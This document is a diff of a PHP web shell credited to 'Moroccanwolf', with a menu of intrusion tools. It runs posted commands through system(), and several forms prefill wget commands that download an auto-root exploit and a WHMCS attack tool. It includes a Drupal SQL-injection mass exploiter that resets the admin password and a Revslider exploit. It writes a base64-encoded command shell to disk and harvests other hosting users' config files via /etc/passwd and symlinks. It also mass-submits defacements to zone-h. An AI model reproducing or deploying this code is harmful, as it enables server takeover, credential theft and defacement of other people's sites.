@@ -54,7 +54,6 @@ echo "</h3>";echo '<form method="POST"><div class="navbar"><ul><center>';echo "
                                         <li><a href='?exploiter'><font><font class=''>Exploiter & scan Tools</font></font></a></li>
                      <li><a href='?kill'><font><font>Self remove</font></font></a></li><li><a name='about' href='?about'><font><font>About</font></font></a></li>                               <center> </ul>
 <div class='clr'></div></div></body></form>";
-
 if (isset($_GET['mailer'])){
 echo "<h6>Mailer</h6>";
 $testa = $_POST['veio'];
@@ -86,7 +85,6 @@ $count++;
 $count--;
 if($ok == "ok")
 echo ""; 
-
 }
 ?>
 <body><center><form action="" method="post" enctype="multipart/form-data" name="form1"><div class="style2"><input type="hidden" name="veio" value="sim">
@@ -134,35 +132,24 @@ moroccanxhack@gmail.com</textarea>
 </form>
 </body>
 <?php
-
 }
 if (isset($_GET['auto'])){
-
 echo'
 <h6>Auto Root (2012-2013-2014-2015) </h6>
 <form method="POST">
-<input type="text" name="command" value="wget http://moroccanwolf.com/autoroot.txt -O root.php" size="43">
+<input type="text" name="command" value="wget https://raw.githubusercontent.com/MwolfProgrammer/tools/master/autoroot.php -O root.php" size="43">
 <input type="submit" name="done" value="Execute">
 </form>
 ';
 $cmd = $_POST['command'];
 if ($_POST['done']){
-
 @mkdir('auto', 0755);
 @chdir('auto');
-
 @system("$cmd");
-
 echo "<h3>DOne /auto/root.php</h3>";
 echo "<h3>use back-connect and cd /auto/root.php , chmod +x root.php , ./root.php</h3>";
-
 }
-
 }
-
-
-
-
 if (isset($_GET['exploiter']) && $_GET['exploiter'] == ""){
 echo '
 <h2>
@@ -171,22 +158,17 @@ echo '
 <a href="?exploiter=rvs">Revslider Exploit<br><br>
 </h2>
 ';
-
 echo '
 <br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>
 ';
-
 }
-
 if (isset($_GET['exploiter']) && $_GET['exploiter'] == "mul"){
-
 echo '
 <h2>
 <a href="?exploiter=dru">Drupal Exploiter</a>-
 <a href="?exploiter=mul">Multi Scan (python)</a>-
 <a href="?exploiter=rvs">Revslider Exploit</a>-</h2>
 ';
-
 echo'
 <h6>Multi Scan Download  </h6>
 <form method="POST">
@@ -194,27 +176,17 @@ echo'
 <input type="submit" name="done" value="Execute">
 </form>
 ';
-
 $cmd = $_POST['command'];
 if ($_POST['done']){
-
 @mkdir('multi', 0755);
 @chdir('multi');
-
 @system("$cmd");
-
 echo "<h3>DOne /multi/scan.py</h3>";
 echo "<h3>use Back connect and do cd /multi/scan.py && chmod +750 && ./scan.py </h3>";
-
 }
-
 echo '<br><br><br><br><br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>';
-
-
 }
-
 elseif (isset($_GET['exploiter']) && $_GET['exploiter'] == "dru"){
-
 echo '
 <h2>
 <a href="?exploiter=dru">Drupal Exploiter</a>-
@@ -222,7 +194,6 @@ echo '
 <a href="?exploiter=rvs">Revslider Exploit</a>-
 </h2>
 ';
-
 ?>
 <h6>Drupal Mass exploiter</h6>
 <form method='post' ><center>
@@ -235,7 +206,6 @@ ur sites ...
 	<br>
 <?php
 if(isset($_POST['lover'])){
-
 	$target = explode("\r\n",$_POST['sites']);;
 	foreach($target as $url){
 	$url = @trim($url);
@@ -256,9 +226,7 @@ if(isset($_POST['lover'])){
 		echo "Error! Either the website isn't vulnerable, or your Internet isn't working. ";
 	}
 }
-
 if(isset($_GET['submit'])){
-
 	$url = "http://".$_GET['url']."/";
 	$post_data = "name[0;update users set name %3D 'rummykhan' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=test3&name[]=Crap&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in";
 	$params = array(
@@ -278,14 +246,11 @@ if(isset($_GET['submit'])){
 	}
 }
 }
-
 echo '
 <br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>
 ';
 }
-
 elseif (isset($_GET['exploiter']) && $_GET['exploiter'] == "rvs"){
-
 echo '
 <h2>
 <a href="?exploiter=dru">Drupal Exploiter</a>-
@@ -306,7 +271,6 @@ error_reporting(0);
 set_time_limit(0);
 $ya=$_POST['go'];
 $co=$_POST['sites'];
-
 if($ya){
  $e=explode("\r\n",$co);
  foreach($e as $bda){
@@ -334,14 +298,10 @@ if($ya){
  }
  
 }
-
-
 echo '
 <br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>
 ';
 }
-
-
 echo '<h3>';
 if (isset($_GET['tools']) && $_GET['tools'] == ""){
 echo '
@@ -358,12 +318,9 @@ echo '
 <a href="?tools=rwp">Ip reverse wordpress</a><br><br>
 </h2>
 ';
-
-
 echo '
 <br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>
 ';
-
 }
 if (isset($_GET['tools']) && $_GET['tools'] == "cmd"){
 echo '
@@ -380,14 +337,8 @@ echo '
 <a href="?tools=rwp">Ip reverse wordpress</a>
 </h2>
 ';
-
-
-
 $kkk ="
 PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBQeXRob24gQ29ubmVjdCBTaGVsbCBQcml2ODwvdGl0bGU+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3MTQuMHp6MC5jb20vMjAxNC8wNi8wNC8yMS8zOTY1NTQzOTQucG5nIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmgzIHsNCnRleHQtZGVjb3JhdGlvbjogbm9uZTsNCiAgZm9udC1mYW1pbHk6IFRhaG9tYSwgQXJpYWwsIHNhbnMtc2VyaWY7DQogIGZvbnQtc2l6ZTogMTBweDsNCiAgY29sb3I6ICMwMDc2QjE7DQogIA0KfQ0KLmFyZWEgew0KICBjb2xvcjogIzAwNzZCMTsNCiAgZm9udC1zaXplOiA5cHQ7DQogIHRleHQtc2hhZG93OiAjMDA3NkIxIDBweCAycHggN3B4Ow0KICBib3JkZXI6IHNvbGlkIDFweCAjMDA3NkIxOw0KICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsNCiAgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwOTkwMDsNCiAgcGFkZGluZzogM3B4Ow0KICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsNCiAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7DQogIGJvcmRlci1yYWRpdXM6IDRweDsNCiAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoMCwxMTksMCkgMHB4IDBweCA7DQp9DQogaW5wdXRbdHlwZT1zdWJtaXRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA3NzA7DQogIGZvbnQtd2VpZ2h0OiBib2xkOyANCnRleHQtYWxpZ246IGNlbnRlcjsgDQogdGV4dC1zaGFkb3c6IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4zKTsNCiAgYmFja2dyb3VuZDogI2FlYWVhZTsgDQogYmFja2dyb3VuZC1jbGlwOiBwYWRkaW5nLWJveDsgDQogYm9yZGVyOiAxcHggc29saWQgIzI4NDQ3MzsgDQogYm9yZGVyLWJvdHRvbS1jb2xvcjogIzIyM2I2NjsgDQogYm9yZGVyLXJhZGl1czogNHB4OyAgDQpjdXJzb3I6IHBvaW50ZXI7ICANCmJhY2tncm91bmQtaW1hZ2U6LXdlYmtpdC1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsNCiBiYWNrZ3JvdW5kLWltYWdlOiAtbW96LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOw0KICBiYWNrZ3JvdW5kLWltYWdlOiAtby1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgDQogYmFja2dyb3VuZC1pbWFnZTogbGluZWFyLWdyYWRpZW50KHRvIGJvdHRvbSwgI2VhZWFlYSwgI2QwZDBkMCk7IA0KIC13ZWJraXQtYm94LXNoYWRvdzogaW5zZXQgMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpLCBpbnNldCAwIDAgN3B4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC40KSwgMCAxcHggMXB4IHJnYmEoMCwgMCwgMCwgMC4xNSk7ICBib3gtc2hhZG93OiBpbnNldCAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSksIGluc2V0IDAgMCA3cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjQpLCAwIDFweCAxcHggcmdiYSgwLCAwLCAwLCAwLjE1KTsgfSANCg0KaW5wdXRbdHlwZT10ZXh0XXsgcGFkZGluZzogM3B4OyBjb2xvcjogIzAwNzZCMTsgdGV4dC1zaGFkb3c6ICMwMDc2QjEgMHB4IDBweCAzcHg7IGJvcmRlcjogMXB4IHNvbGlkICMwMDc2QjE7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDA3NkIxOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDg1LDg1LDg1KSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6ICMwMDc2QjEgMHB4IDBweCA0cHg7fSANCg0KDQoNCg0KPC9zdHlsZT4NCjw/cGhwDQplY2hvICcNCjxjZW50ZXI+DQo8Zm9ybSBtZXRob2Q9R0VUPg0KPHA+PHRleHRhcmVhIGNsYXNzPSJhcmVhIiByb3dzPSIxMyIgbmFtZT0idGV4dCIgdmFsdWU9InB5dCIgY29scz0iNzAiID4nOw0KDQoNCmlmIChzdHJsZW4oJF9HRVRbJ2NvbW1hbmQnXSk+MSAmJiAkX0dFVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9HRVRbJ2V4ZWNtZXRob2QnXSgkX0dFVFsnY29tbWFuZCddKTt9DQppZiAoc3RybGVuKCRfUE9TVFsnY29tbWFuZCddKT4xICYmICRfUE9TVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9QT1NUWydleGVjbWV0aG9kJ10oJF9QT1NUWydjb21tYW5kJ10pO30NCg0KaWYgKHN0cmxlbigkX0dFVFsnY29tbWFuZCddKT4xICYmICRfR0VUWydleGVjbWV0aG9kJ109PSJwb3BlbiIpew0KcG9wZW4oJF9HRVRbJ2NvbW1hbmQnXSwiciIpO30NCg0KZWNobyc8L3RleHRhcmVhPjwvcD4NCjxwPjxjZW50ZXI+PC9jZW50ZXI+PC9wPg0KPHAgYWxpZ249ImNlbnRlciI+PHN0cm9uZz48L3N0cm9uZz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT0idnciIHNpemU9IjUwIiB2YWx1ZT0iY21kIj4gPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNvbW1hbmQiIHNpemU9IjQzIj4gPHNlbGVjdCBuYW1lPWV4ZWNtZXRob2Q+DQo8b3B0aW9uIHZhbHVlPSJzeXN0ZW0iPlN5c3RlbTwvb3B0aW9uPiAgPG9wdGlvbiB2YWx1ZT0iZXhlYyI+RXhlYzwvb3B0aW9uPiAgPG9wdGlvbiB2YWx1ZT0icGFzc3RocnUiPlBhc3N0aHJ1PC9vcHRpb24+PG9wdGlvbiB2YWx1ZT0icG9wZW4iPnBvcGVuPC9vcHRpb24+DQo8L3NlbGVjdD4gPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ia2trIiB2YWx1ZT0iRXhlY3V0ZSI+DQo8L3A+PC9mb3JtPic7DQoNCj8+";
-
-
-
 $file = fopen("mwolf.php" ,"w+");
 $write = fwrite ($file ,base64_decode($kkk));
 fclose($file);
@@ -408,26 +359,19 @@ echo '
 <a href="?tools=rjom">Ip reverse Joomla</a>-
 <a href="?tools=rwp">Ip reverse wordpress</a></h2>
 ';
-
 echo'
 <h6>Whmcs Killer Download : </h6>
 <form method="POST">
-<input type="text" name="command" value="wget http://moroccanwolf.com/wkv3.txt -O killer.php" size="43">
+<input type="text" name="command" value="wget https://raw.githubusercontent.com/MwolfProgrammer/tools/master/wkv3.php -O killer.php" size="43">
 <input type="submit" name="done" value="Execute">
 </form>
 ';
-
 $cmd = $_POST['command'];
 if ($_POST['done']){
-
 @mkdir('whmcs', 0755);
 @chdir('whmcs');
-
 @system("$cmd");
-
 echo "<h3>DOne /whmcs/killer.php</h3>";
-
-
 }
 echo '<br><br><br><br><br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>';
 }
@@ -445,340 +389,147 @@ echo '
 <a href="?tools=rjom">Ip reverse Joomla</a>-
 <a href="?tools=rwp">Ip reverse wordpress</a></h2>
 ';
-
 echo "<h6>Zone-h notifier</h6>";
 ob_start();
-
 $sub = get_loaded_extensions();
-
 if(!in_array("curl", $sub)){
-
 die('Can not connect to this server to reconnect to the server ip_address');
-
 }
-
-
-
-
 if($_POST) {
-
 $hacker = $_POST['defacer'];
-
 $method = $_POST['hackmode'];
-
 $neden = $_POST['reason'];
-
 $site = $_POST['domain'];
-
-
-
 if ($hacker == "") {
-
-
-
 die ("<center>Which distorted and said that if the answer is yes, type the name of<center>");
-
 }
-
 elseif($method == "--------SELECT--------") {
-
 die("<center>Method must be told</center>");
-
 }
-
 elseif($neden == "--------SELECT--------") {
-
-
-
 die("<center>Why do I have to tell</center>");
-
 }
-
 elseif($site == "") {
-
-
-
 die("<center>Registration continued breakthroughs in the locations Zone H </center>");
-
 }
-
-
-
-
-
 $i = 0;
-
 $sites = explode("\n", $site);
-
 while($i < count($sites)) {
-
 if(substr($sites[$i], 0, 4) != "http") {
-
 $sites[$i] = "http://".$sites[$i];
-
-
-
 }
-
-
-
 poster("http://zone-h.org/notify/single", $hacker, $method, $neden, $sites[$i]);
-
-
-
 ++$i;
-
 }
-
 echo "<center><p>Zone-h Mass Deface Poster {Moroccanwolf}</p></center>";
-
-
-
 }else{
-
-
-
 echo '<h3><center>
-
-
 <form action="" method="post">
-
 <div id="option">
-
 <p>Defacer<br />
-
 <span class="ok"><input type="text" name="defacer" value=" Moroccanwolf" size="40" /></span> </p>
-
-
-
 <p>How to hack <br /><select name="hackmode">
-
 <option >--------SELECT--------</option>
-
 <option value="1">known vulnerability (i.e. unpatched system)</option>
-
 <option
-
 value="2" >undisclosed (new) vulnerability</option>
-
 <option
-
 value="3" >configuration / admin. mistake</option>
-
 <option
-
 value="4" >brute force attack</option>
-
-
-
 <option
-
 value="5" >social engineering</option>
-
 <option
-
 value="6" >Web Server intrusion</option>
-
 <option
-
 value="7" >Web Server external module intrusion</option>
-
 <option
-
 value="8" >Mail Server intrusion</option>
-
 <option
-
 value="9" >FTP Server intrusion</option>
-
 <option
-
 value="10" >SSH Server intrusion</option>
-
-
-
 <option
-
 value="11" >Telnet Server intrusion</option>
-
 <option
-
 value="12" >RPC Server intrusion</option>
-
 <option
-
 value="13" >Shares misconfiguration</option>
-
 <option
-
 value="14" >Other Server intrusion</option>
-
 <option
-
 value="15" selected="selected">SQL Injection</option>
-
 <option
-
 value="16" >URL Poisoning</option>
-
-
-
 <option
-
 value="17" >File Inclusion</option>
-
 <option
-
 value="18" >Other Web Application bug</option>
-
 <option
-
 value="19" >Remote administrative panel access through bruteforcing</option>
-
 <option
-
 value="20" >Remote administrative panel access through password guessing</option>
-
 <option
-
 value="21" >Remote administrative panel access through social engineering</option>
-
 <option
-
 value="22" >Attack against the administrator/user (password stealing/sniffing)</option>
-
-
-
 <option
-
 value="23" >Access credentials through Man In the Middle attack</option>
-
 <option
-
 value="24" >Remote service password guessing</option>
-
 <option
-
 value="25" >Remote service password bruteforce</option>
-
 <option
-
 value="26" >Rerouting after attacking the Firewall</option>
-
 <option
-
 value="27" >Rerouting after attacking the Router</option>
-
 <option
-
 value="28" >DNS attack through social engineering</option>
-
-
-
 <option
-
 value="29" >DNS attack through cache poisoning</option>
-
 <option
-
 value="30" >Not available</option>
-
 </select></p>
-
 <p> Cause of hack ? <br /><select name="reason">
-
-
-
 <option >--------SELECT--------</option>
-
 <option
-
 value="1" selected="selected" >Heh...just for fun!</option>
-
 <option
-
 value="2" >Revenge against that website</option>
-
 <option
-
 value="3" >Political reasons</option>
-
 <option
-
 value="4" >As a challenge</option>
-
 <option
-
 value="5" >I just want to be the best defacer</option>
-
-
-
 <option
-
 value="6" >Patriotism</option>
-
 <option
-
 value="7" >Not available</option>
-
 </select> </p>
-
-
-
 <p>Sites <br />
-
 <span class="fur">Put all the sites on the server</span><br />
-
 <span class=""><textarea name="domain" cols="43" rows="17"></textarea></span> </p>
-
 <p><input type="submit" value="Send" />
-
 </form>
-
 <br><br />
 </div>
-
 </center></h3>';
-
-
-
 }
-
-
-
 function poster($url, $hacker, $hackmode,$reson, $site )
-
 {
-
-
-
 $k = curl_init();
-
 curl_setopt($k, CURLOPT_URL, $url);
-
 curl_setopt($k,CURLOPT_POST,true);
-
 curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson);
-
 curl_setopt($k,CURLOPT_FOLLOWLOCATION, true);
-
 curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
-
-
-
 $kubra = curl_exec($k);
-
 curl_close($k);
-
 return $kubra;
-
 }
-
-
 echo "<br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>";
 }
-
-
 elseif (isset($_GET['tools']) && $_GET['tools'] == "cnf"){
 echo '
 <h2>
@@ -793,7 +544,6 @@ echo '
 <a href="?tools=rjom">Ip reverse Joomla</a>-
 <a href="?tools=rwp">Ip reverse wordpress</a></h2>
 ';
-
 echo "<br><center><h6>Config Grabber</h6>";?></center><br><center><?php if (empty($_POST['config'])) { ?><p><font face="Tahoma" color="#007700" size="2pt"></p><br><form method="POST"><textarea name="passwd" class='area' rows='15' cols='60'><?php echo file_get_contents('/etc/passwd'); ?></textarea><br><br><input name="config" class='inputzbut' size="100" value="GET Config" type="submit"><br></form></center><br><?php }if ($_POST['config']) {$function = $functions=@ini_get("disable_functions");if(eregi("symlink",$functions)){die ('<error>Symlink is disabled :( </error>');}@mkdir('mwolfconfig', 0755);@chdir('mwolfconfig');
 $htaccess="
 OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
@@ -810,10 +560,8 @@ AddHandler txt .shtml
 Options All
 Options All";
 file_put_contents(".htaccess",$htaccess,FILE_APPEND);$passwd=$_POST["passwd"];$passwd=explode("\n",$passwd);echo "<br><br><center><font color=#b0b000 size=2pt>Founding ...</center><br>";foreach($passwd as $pwd){$pawd=explode(":",$pwd);$user =$pawd[0];@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');@symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');@symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');@symlink('/home/'.$user.'/public_html/config.php',$user.'-configgg.txt');@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-wp-home.txt');@symlink('/home/'.$user.'/public_html/db.php',$user.'-dbconf.txt');@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');@symlink('/home/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-wp-test.txt');@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-joomla-protal.txt');@symlink('/home/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');@symlink('/home/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-joomla-home.txt');@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm15.txt');@symlink('/home/'.$user.'/public_html/central/configuration.php',$user.'-whm-central.txt');@symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');@symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');@symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmcs.txt');@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-support.txt');@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-whmcs2.txt');@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm.txt');}echo '<b class="cone"><font face="Tahoma" color="#00dd00" size="2pt"><b>[Grabbered] -></b> <a target="_blank" href="mwolfconfig">Open configs</a></font></b>';}
-
 echo "<br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>";
 }
-
 elseif (isset($_GET['tools']) && $_GET['tools'] == "wri"){
 echo '
 <h2>
@@ -828,13 +576,10 @@ echo '
 <a href="?tools=rjom">Ip reverse Joomla</a>-
 <a href="?tools=rwp">Ip reverse wordpress</a></h2>
 ';
-
 echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#0076B1"><h6>Find Directory Writable/Readable</h6></span></center><br><br>'.$end; function read_dir($path) { global $count; if ($handle = opendir($path)) { while (false !== ($file = readdir($handle))) { $dr="$path$file/"; if (($file!='.') and ($file!='..') and is_dir($dr)) { if (is_readable($dr) and is_writeable($dr)) { echo "[RW] " . $dr . "<br>\n\r"; $count++; } read_dir($dr); }}}} $count=0; set_time_limit(0); @$passwd=fopen('/etc/passwd','r'); if (!$passwd) { echo "<br><center><font color='#ff0000' size='2pt' />[-] No Access to /etc/passwd\n\r</center>"; exit;} $path_to_public=array(); echo "<html><center><table style='margin: 0 auto;'><tr valign='top'><td align='left'><font color='#0076B1' size='2pt' />\n\r"; while(!feof($passwd)) { $str=fgets($passwd); $pos=strpos($str,":"); $username=substr($str,0,$pos); $dirz="/home/$username/public_html/"; if (($username!="")) { if (is_readable($dirz)) { array_push($path_to_public,$dirz); if (is_writeable($dirz)) { $count++; echo "<font color=white>[</font><font color=yellow>R</font><font color=#0076B1>W</font><font color=white>]</font> " . $dirz . "<br><br><br>\n\r";} else echo "<font color=white>[</font><font color=yellow>R</font><font color=white>]</font> " . $dirz . "<br>\n\r"; }}} echo "<br><br><font color=white size=2pt>[+]</font> <font color=#0076B1 size=2pt>Found </font><font color=yellow size=2pt>" . sizeof($path_to_public) . "</font> <font color=#0076B1 size=2pt>readable public_html directories.</font><br><br>\n\r\n\r"; if (sizeof($path_to_public) != '0') { foreach ($path_to_public as $path) { } echo "<font color=white size=2pt>[+]</font> <font color=#0076B1 size=2pt>Found</font><font color=yellow size=2pt> " . $count . " </font><font color=#0076B1 size=2pt>writable directories.</font>\n\r"; echo "</td></tr></table></center></html>";
 }
-
 echo "<br><br><br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>";
 }
-
 elseif (isset($_GET['tools']) && $_GET['tools'] == "con"){
 echo '
 <h2>
@@ -849,7 +594,6 @@ echo '
 <a href="?tools=rjom">Ip reverse Joomla</a>-
 <a href="?tools=rwp">Ip reverse wordpress</a></h2>
 ';
-
 echo"<center>
 <h6>Mysql Connect </h6>
 <form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr> 
@@ -993,11 +737,8 @@ echo '<pre class=ml1>'.htmlspecialchars($file['file']).'</pre>';
 } else { 
 echo htmlspecialchars($db->error()); 
 } 
-
 echo "<br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>";
 }
-
-
 elseif (isset($_GET['tools']) && $_GET['tools'] == "con1"){
 echo '
 <h2>
@@ -1012,8 +753,6 @@ echo '
 <a href="?tools=rjom">Ip reverse Joomla</a>-
 <a href="?tools=rwp">Ip reverse wordpress</a></h2>
 ';
-
-
 echo'
 <h6>Mysql Connect  Download </h6>
 <form method="POST">
@@ -1021,22 +760,15 @@ echo'
 <input type="submit" name="done" value="Execute">
 </form>
 ';
-
 $cmd = $_POST['command'];
 if ($_POST['done']){
-
 @mkdir('mysql', 0755);
 @chdir('mysql');
-
 @system("$cmd");
-
 echo "<h3>DOne /mysql/con.php</h3>";
-
-
 }
 echo '<br><br><br><br><br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>';
 }
-
 elseif (isset($_GET['tools']) && $_GET['tools'] == "rev"){
 echo '
 <h2>
@@ -1051,12 +783,8 @@ echo '
 <a href="?tools=rjom">Ip reverse Joomla</a>-
 <a href="?tools=rwp">Ip reverse wordpress</a></h2>
 ';
-
-
 echo "<center><h6>reverse ip lookup</h6></center><div id=result>";
-
 $kkk = "PGhlYWQ+DQo8c3R5bGU+DQppbnB1dFt0eXBlPXN1Ym1pdF17IHBhZGRpbmc6IDNweDsgY29sb3I6ICMwMDc3MDsNCiAgZm9udC13ZWlnaHQ6IGJvbGQ7IA0KdGV4dC1hbGlnbjogY2VudGVyOyANCiB0ZXh0LXNoYWRvdzogMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjMpOw0KICBiYWNrZ3JvdW5kOiAjYWVhZWFlOyANCiBiYWNrZ3JvdW5kLWNsaXA6IHBhZGRpbmctYm94OyANCiBib3JkZXI6IDFweCBzb2xpZCAjMjg0NDczOyANCiBib3JkZXItYm90dG9tLWNvbG9yOiAjMjIzYjY2OyANCiBib3JkZXItcmFkaXVzOiA0cHg7ICANCmN1cnNvcjogcG9pbnRlcjsgIA0KYmFja2dyb3VuZC1pbWFnZTotd2Via2l0LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOw0KIGJhY2tncm91bmQtaW1hZ2U6IC1tb3otbGluZWFyLWdyYWRpZW50KHRvcCwgI2VhZWFlYSwgI2QwZDBkMCk7DQogIGJhY2tncm91bmQtaW1hZ2U6IC1vLWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOyANCiBiYWNrZ3JvdW5kLWltYWdlOiBsaW5lYXItZ3JhZGllbnQodG8gYm90dG9tLCAjZWFlYWVhLCAjZDBkMGQwKTsgDQogLXdlYmtpdC1ib3gtc2hhZG93OiBpbnNldCAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSksIGluc2V0IDAgMCA3cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjQpLCAwIDFweCAxcHggcmdiYSgwLCAwLCAwLCAwLjE1KTsgIGJveC1zaGFkb3c6IGluc2V0IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC41KSwgaW5zZXQgMCAwIDdweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNCksIDAgMXB4IDFweCByZ2JhKDAsIDAsIDAsIDAuMTUpOyB9IA0KDQppbnB1dFt0eXBlPXRleHRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA3NkIxOyB0ZXh0LXNoYWRvdzogIzAwNzZCMSAwcHggMHB4IDNweDsgYm9yZGVyOiAxcHggc29saWQgIzAwNzZCMTsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IGJveC1zaGFkb3c6IDBweCAwcHggNHB4ICMwMDc2QjE7ICAgIHBhZGRpbmc6IDNweDsgICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsgICAtbW96LWJvcmRlci1yYWRpdXM6IDRweDsgICBib3JkZXItcmFkaXVzOiA0cHg7ICAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoODUsODUsODUpIDBweCAwcHggNHB4OyAgIC1tb3otYm94LXNoYWRvdzogIzAwNzZCMSAwcHggMHB4IDRweDt9IA0KDQogDQogICAg